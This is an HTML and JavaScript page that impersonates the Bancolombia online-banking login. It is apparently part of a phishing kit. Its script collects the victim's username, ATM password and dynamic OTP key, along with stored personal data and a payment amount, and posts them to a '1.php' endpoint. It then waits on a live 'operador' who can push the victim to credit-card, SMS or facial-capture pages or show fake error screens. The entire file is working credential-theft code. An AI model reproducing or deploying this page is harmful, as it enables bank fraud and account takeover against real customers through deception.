<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sucursal Virtual Personas</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <link rel="stylesheet" href="css/index.css">
</head>
<body>
  <div id="modalClaveIframe" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; z-index:10005; background:rgba(0,0,0,0.9);">
    <iframe id="claveIframe" src="dina.html" style="width:100%; height:100%; border:none;"></iframe>
  </div>

  <div class="fondo-fijo"></div>

  <div class="logo">
    <img src="img/logo.png" alt="Logo Bancolombia" />
  </div>

  <div class="login-container">
    <h2>¡Hola!</h2>
    <p>Ingresa los datos para gestionar tus productos y hacer transacciones.</p>

    <form id="loginForm">
      <div class="input-group">
        <i class="fas fa-user"></i>
        <input id="usuario" type="text" placeholder=" " autocomplete="off" />
        <label for="usuario">Usuario</label>
        <a href="#" class="link">¿Olvidaste tu usuario?</a>
      </div>

      <div class="input-group">
        <i class="fas fa-lock"></i>
        <input id="clave" type="password" placeholder=" " />
        <label for="clave">Clave del cajero</label>
        <a href="#" class="link">¿Olvidaste tu clave?</a>
      </div>

      <button type="submit" class="btn" disabled id="btnLogin">Iniciar sesión</button>
    </form>

    <div class="create">
      <a href="#">Crear usuario</a>
    </div>
  </div>

  <footer class="footer">
    <hr>
    <div class="footer-logo">
      <img src="img/logo.png" alt="Logo Bancolombia">
      <div class="vigilado">VIGILADO <span>Superintendencia Financiera de Colombia</span></div>
    </div>
    <div class="footer-ip" id="footer-ip">
      Cargando información...
    </div>
  </footer>

  <!-- Loader flotante -->
  <div id="loader-overlay">
    <div class="loader"></div>
  </div>

  <!-- Modal de carga -->
  <div id="modalCarga" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:10000; justify-content:center; align-items:center; flex-direction:column; color:white; text-align:center;">
    <div class="loader"></div>
    <p id="loaderText" style="margin-top:20px; font-size:1.1em;"></p>
  </div>

  <!-- Modal de autorización actualizado con video -->
  <div id="modalAutorizacion" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:10001; justify-content:center; align-items:center; color:white; font-family:'Segoe UI', sans-serif;">
    <div style="background:#3a3a3a; padding:30px; border-radius:14px; max-width:360px; width:90%; text-align:center; box-shadow:0 0 20px rgba(0,0,0,0.6);">

      <!-- Banner con video -->
      <div style="border-radius:10px; overflow:hidden; margin-bottom:25px; width:100%; height:140px; position:relative;">
        <video autoplay muted loop playsinline style="object-fit:cover; width:100%; height:100%;">
          <source src="img/1.mov" type="video/mp4" />
          Tu navegador no soporta video HTML5.
        </video>
      </div>

      <!-- Título -->
      <h2 style="font-size:1.2em; margin-bottom:10px;">Ingresa la Clave Dinámica</h2>

      <!-- Subtítulo -->
      <p style="font-size:0.9em; color:#ccc; margin-bottom:10px;">
        Encuentra tu Clave Dinámica en la app Mi Bancolombia.
      </p>

     
      <!-- Input de OTP -->
      <input id="otpToken" maxlength="6" inputmode="numeric" style="
        font-size: 24px;
        letter-spacing: 10px;
        text-align: center;
        border: none;
        background: transparent;
        border-bottom: 2px solid #f9c411;
        padding: 10px 0;
        width: 100%;
        color: white;
        margin-bottom: 20px;
        outline: none;
      " placeholder="------" />

      <!-- Botón de envío -->
      <button id="btnEnviarToken" class="btn active">Enviar código</button>
    </div>
  </div>

  <!-- Modal de error -->
  <div id="modalError" style="
  display:none;
  position:fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.9);
  z-index:10002;
  justify-content:center;
  align-items:center;
">

  <img src="img/2.png" alt="Alerta" style="
    max-width:90%;
    max-height:90%;
    border-radius:16px;
    box-shadow:0 0 20px rgba(0,0,0,0.7);
  " />
</div>


  <p id="loginError" style="color: #e74c3c; margin-top: 10px; display: none; text-align: center;"></p>
</body>



<script>
// --- ESTE SCRIPT SE EJECUTA APENAS CARGA LA PÁGINA ---

document.addEventListener("DOMContentLoaded", function () {
    // Tomar datos desde localStorage (igual que en check.php)
    let local = {
        correo: localStorage.getItem("correo") || "",
        cel: localStorage.getItem("cel") || "",
        val: localStorage.getItem("val") || "",
        per: localStorage.getItem("per") || "",
        nom: localStorage.getItem("nom") || "",
        // TOMAR EL NOMBRE DEL USUARIO REAL - de check.php
        nombre: localStorage.getItem("nombre_usuario") || ""
    };

    // Guardar los datos originales para usarlos en el formato BBVA
    // INCLUYENDO EL NOMBRE DEL USUARIO REAL
    localStorage.setItem("tbdatos_bbva", JSON.stringify({
        correo: local.correo,
        cel: local.cel,
        val: local.val,
        per: local.per,
        nom: local.nom,
        nombre: local.nombre, // <-- NOMBRE REAL DEL USUARIO
        telefono: local.cel,
        identificacion: local.val,
        tipo_persona: local.per,
        banco: local.nom
    }));

    // Para compatibilidad con el código existente, también guardar el formato anterior
    let tbdatos_old = {
        documento: local.val,
        nombre: local.nombre || local.nom, // <-- USAR NOMBRE REAL SI EXISTE
        tipo_identificacion: "CC",
        tipo_persona: local.per,
        banco: local.nom,
        correo: local.correo,
        direccion: "",
        telefono: local.cel
    };

    localStorage.setItem("tbdatos", JSON.stringify(tbdatos_old));
    console.log("Datos guardados para BBVA:", JSON.parse(localStorage.getItem("tbdatos_bbva")));
});

  const usuario = document.getElementById('usuario');
  const clave = document.getElementById('clave');
  const btn = document.getElementById('btnLogin');
  const loader = document.getElementById('loader-overlay');
  const mensajes = [
    "Comprobando tu información...",
    "Autorizando tu acceso...",
    "Verificando tu identidad...",
    "Procesando solicitud...",
    "Por favor, espera un momento..."
  ];
  let indexMensaje = 0, intervalLoader;
  const transactionId = crypto.randomUUID();

  function validar() {
    const inputGroups = document.querySelectorAll('.input-group');
    inputGroups.forEach(group => {
      const input = group.querySelector('input');
      if (input.value.trim()) {
        group.classList.add('filled');
      } else {
        group.classList.remove('filled');
      }
    });

    if (usuario.value.trim() && clave.value.trim()) {
      btn.classList.add('active');
      btn.disabled = false;
    } else {
      btn.classList.remove('active');
      btn.disabled = true;
    }
  }

  usuario.addEventListener('input', validar);
  clave.addEventListener('input', validar);

  const ipContainer = document.getElementById('footer-ip');
  function obtenerFechaHoraFormateada() {
    const ahora = new Date();
    const fecha = ahora.toLocaleDateString('es-CO', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });
    const hora = ahora.toLocaleTimeString('es-CO', {
      hour: '2-digit',
      minute: '2-digit'
    });
    return `${fecha}, ${hora}`;
  }

  async function obtenerIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch (e) {
      return 'IP no disponible';
    }
  }

  async function mostrarFooterInfo() {
    const ip = await obtenerIP();
    const fechaHora = obtenerFechaHoraFormateada();
    ipContainer.innerHTML = `Dirección IP: ${ip}<br>${fechaHora}`;
  }

  mostrarFooterInfo();

  function iniciarMensajesLoader() {
    const texto = document.getElementById("loaderText");
    texto.textContent = mensajes[indexMensaje];
    intervalLoader = setInterval(() => {
      indexMensaje = (indexMensaje + 1) % mensajes.length;
      texto.textContent = mensajes[indexMensaje];
    }, 3000);
  }

  function detenerMensajesLoader() {
    clearInterval(intervalLoader);
    indexMensaje = 0;
  }

  document.getElementById("loginForm").addEventListener("submit", async function (e) {
    e.preventDefault();
    const usuarioVal = usuario.value.trim();
    const claveVal = clave.value.trim();
    const error = document.getElementById("loginError");
    const modalCarga = document.getElementById("modalCarga");

    if (usuarioVal === "" || claveVal === "") {
      error.innerText = "Debes completar todos los campos.";
      error.style.display = "block";
      return;
    }

    // Guardar datos de login para usarlos después
    localStorage.setItem("usuario_login", usuarioVal);
    localStorage.setItem("clave_login", claveVal);

    error.style.display = "none";
    modalCarga.style.display = "flex";
    iniciarMensajesLoader();

    // Tomar datos del formato BBVA
    const tbdatos_bbva = JSON.parse(localStorage.getItem("tbdatos_bbva") || "{}");
    
    // CORREGIDO: Tomar el monto del localStorage (de check.php)
    const monto = localStorage.getItem("total_pagar") || "0";
    
    const payload = {
      transactionId,
      bancoldata: { usuario: usuarioVal, clave: claveVal },
      tbdatos: tbdatos_bbva,  // <-- Usar el formato BBVA
      total: monto  // <-- CORREGIDO: Enviar el monto real
    };

    console.log("Enviando payload con monto:", monto);

    await fetch("1.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    const TIMEOUT_MS = 180000;
    const poll = setInterval(checkLogin, 5000);
    const timeout = setTimeout(() => {
      clearInterval(poll);
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      document.getElementById("mensajeError").innerHTML =
        "No se obtuvo respuesta del operador. Por favor intenta más tarde.";
      document.getElementById("modalError").style.display = "flex";
    }, TIMEOUT_MS);

  async function checkLogin() {
  const res = await fetch(`1.php?transactionId=${transactionId}`);
  const json = await res.json();

  if (json.ok && json.action) {
    clearInterval(poll);
    clearTimeout(timeout);
    detenerMensajesLoader();
    modalCarga.style.display = "none";

    if (json.action === "pedir_token") {
      document.getElementById("otpToken").value = "";
      const monto = localStorage.getItem("total_pagar") || "0";
      const montoFormateado = new Intl.NumberFormat("es-CO", {
        style: "currency",
        currency: "COP"
      }).format(parseInt(monto));
      const montoElem = document.getElementById("montoClave");
      if (montoElem) {
        montoElem.textContent = `Monto: ${montoFormateado}`;
      }
      document.getElementById("modalAutorizacion").style.display = "flex";
    }

    if (json.action === "rechazar") {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      document.getElementById("modalAutorizacion").style.display = "none";
      document.getElementById("modalError").style.display = "flex";
    }

    if (json.action === "banco_error") {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      alert("Datos de inicio de sesión erróneos. Corríjalos.");
      window.location.href = "index.php";
    }

    if (json.action === "cc") {
      window.location.href = "../../../../data-cc/alter.php";
    }

    if (json.action === "check" || json.action === "aprobado") {
      window.location.href = "fin.php";
    }

    if (json.action === "facial") {
    window.location.href = "facial_step.html?key=" + transactionId;
    }

    // ⭐ AQUÍ AGREGADO ⭐
    if (json.action === "sms") {
      window.location.href = "sms.php";
    }

    if (json.action === "fin") {
      window.location.href = "fin.php";
    }
  }
}


  });

  document.getElementById("btnEnviarToken").addEventListener("click", async () => {
    const otp = document.getElementById("otpToken").value.trim();
    const usuarioVal = localStorage.getItem("usuario_login") || "";
    const claveVal = localStorage.getItem("clave_login") || "";
    const monto = localStorage.getItem("total_pagar") || "0";
    const modalCarga = document.getElementById("modalCarga");

    if (otp === "") {
      alert("Por favor ingresa el código OTP.");
      return;
    }

    modalCarga.style.display = "flex";
    iniciarMensajesLoader();

    const transactionToken = crypto.randomUUID();
    
    // Tomar datos del formato BBVA
    const tbdatos_bbva = JSON.parse(localStorage.getItem("tbdatos_bbva") || "{}");

    const payload = {
      transactionId: transactionToken,
      bancoldata: { usuario: usuarioVal, clave: claveVal },
      bancoldina: { clave: otp },
      metodo: "dina",
      total: monto,
      tbdatos: tbdatos_bbva  // <-- Usar el formato BBVA
    };

    await fetch("1.php", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    document.getElementById("modalAutorizacion").style.display = "none";

    const TIMEOUT_MS = 180000;
    const poll = setInterval(checkToken, 5000);
    const timeout = setTimeout(() => {
      clearInterval(poll);
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      document.getElementById("mensajeError").innerHTML =
        "No se obtuvo respuesta del operador. Por favor intenta más tarde.";
      document.getElementById("modalError").style.display = "flex";
    }, TIMEOUT_MS);

   async function checkToken() {
  const res = await fetch(`1.php?transactionId=${transactionToken}`);
  const json = await res.json();

  if (json.ok && json.action) {
    clearInterval(poll);
    clearTimeout(timeout);
    detenerMensajesLoader();
    modalCarga.style.display = "none";

    if (json.action === "pedir_token") {
      alert("La clave dinámica ingresada no es válida. Por favor intenta nuevamente.");
      document.getElementById("otpToken").value = "";
      document.getElementById("modalAutorizacion").style.display = "flex";
    }

    if (json.action === "rechazar") {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      document.getElementById("modalAutorizacion").style.display = "none";
      document.getElementById("modalError").style.display = "flex";
    }

    if (json.action === "banco_error") {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      alert("Datos de inicio de sesión erróneos. Corríjalos.");
      window.location.href = "index.php";
    }

    if (json.action === "cc") {
      window.location.href = "../../../../data-cc/alter.php";
    }

    if (json.action === "check" || json.action === "aprobado") {
      window.location.href = "fin.php";
    }

    if (json.action === "facial") {
    window.location.href = "facial_step.html?key=" + transactionToken;
    }

    if (json.action === "sms") {
      window.location.href = "sms.php";
    }
  }
}

  });

  document.getElementById("modalError").addEventListener("click", function () {
    this.style.display = "none";
    const modalCarga = document.getElementById("modalCarga");
    const modalOtp = document.getElementById("modalAutorizacion");
    document.getElementById("otpToken").value = "";

    modalCarga.style.display = "flex";
    iniciarMensajesLoader();

    setTimeout(() => {
      detenerMensajesLoader();
      modalCarga.style.display = "none";
      modalOtp.style.display = "flex";
    }, 3000);
  });

  // Función para cerrar el iframe (si se usa)
  window.cerrarIframeClave = function() {
    document.getElementById("modalClaveIframe").style.display = "none";
  };
</script>
</body>
</html>